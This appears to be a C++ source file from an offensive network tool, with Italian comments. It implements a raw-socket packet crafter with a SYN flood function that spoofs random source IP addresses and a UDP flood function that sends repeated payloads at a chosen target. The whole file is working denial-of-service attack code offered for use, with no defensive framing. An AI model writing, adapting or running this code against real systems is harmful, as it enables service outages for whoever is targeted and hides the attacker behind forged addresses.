#include "netnemesis.h"
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

// Pseudo header per checksum TCP
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

PacketCrafter::PacketCrafter() : raw_socket(-1) {}

PacketCrafter::~PacketCrafter() {
    if (raw_socket >= 0) close(raw_socket);
}

bool PacketCrafter::initialize() {
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_socket < 0) {
        Utils::logError("Impossibile creare raw socket (richiede root)");
        return false;
    }
    
    int one = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        Utils::logError("Impossibile settare IP_HDRINCL");
        return false;
    }
    
    Utils::logSuccess("Raw socket inizializzato - Packet crafting pronto");
    return true;
}

unsigned short PacketCrafter::calculateChecksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void PacketCrafter::buildIpHeader(struct iphdr *iph, int dest_ip, int packet_len) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = packet_len;
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("10.0.0.1"); // IP fittizio, verrà randomizzato
    iph->daddr = dest_ip;
    iph->check = calculateChecksum((unsigned short *)iph, sizeof(struct iphdr) >> 1);
}

void PacketCrafter::buildTcpHeader(struct tcphdr *tcph, int src_port, int dest_port, int seq, int ack, int flags) {
    tcph->source = htons(src_port);
    tcph->dest = htons(dest_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5;
    tcph->fin = (flags & 0x01) ? 1 : 0;
    tcph->syn = (flags & 0x02) ? 1 : 0;
    tcph->rst = (flags & 0x04) ? 1 : 0;
    tcph->psh = (flags & 0x08) ? 1 : 0;
    tcph->ack = (flags & 0x10) ? 1 : 0;
    tcph->urg = (flags & 0x20) ? 1 : 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void PacketCrafter::sendSYNFlood(const std::string &target, int port, int packets) {
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &dest_addr.sin_addr);
    
    Utils::logAttack("Avvio SYN Flood su " + target + ":" + std::to_string(port));
    
    for (int i = 0; i < packets && g_running; i++) {
        memset(packet, 0, PACKET_SIZE);
        
        // Randomizza IP sorgente
        struct in_addr src_addr;
        src_addr.s_addr = rand();
        iph->saddr = src_addr.s_addr;
        
        buildIpHeader(iph, dest_addr.sin_addr.s_addr, sizeof(struct iphdr) + sizeof(struct tcphdr));
        buildTcpHeader(tcph, rand() % 65535, port, rand(), 0, 0x02); // SYN flag
        
        // Calcola checksum TCP
        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = dest_addr.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = new char[psize];
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = calculateChecksum((unsigned short*)pseudogram, psize >> 1);
        delete[] pseudogram;
        
        if (sendto(raw_socket, packet, iph->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            continue;
        }
        
        if (i % 100 == 0) {
            std::lock_guard<std::mutex> lock(g_print_mutex);
            std::cout << "\r\033[31m[SYN FLOOD] Pacchetti inviati: " << i << "\033[0m" << std::flush;
        }
    }
    std::cout << std::endl;
    Utils::logSuccess("SYN Flood completato");
}

void PacketCrafter::sendUDPFlood(const std::string &target, int port, int packets) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);
    
    char payload[1024];
    memset(payload, 'A', sizeof(payload));
    
    Utils::logAttack("Avvio UDP Flood su " + target + ":" + std::to_string(port));
    
    for (int i = 0; i < packets && g_running; i++) {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&addr, sizeof(addr));
        if (i % 100 == 0) {
            std::lock_guard<std::mutex> lock(g_print_mutex);
            std::cout << "\r\033[31m[UDP FLOOD] Pacchetti inviati: " << i << "\033[0m" << std::flush;
        }
    }
    close(sock);
    std::cout << std::endl;
    Utils::logSuccess("UDP Flood completato");
}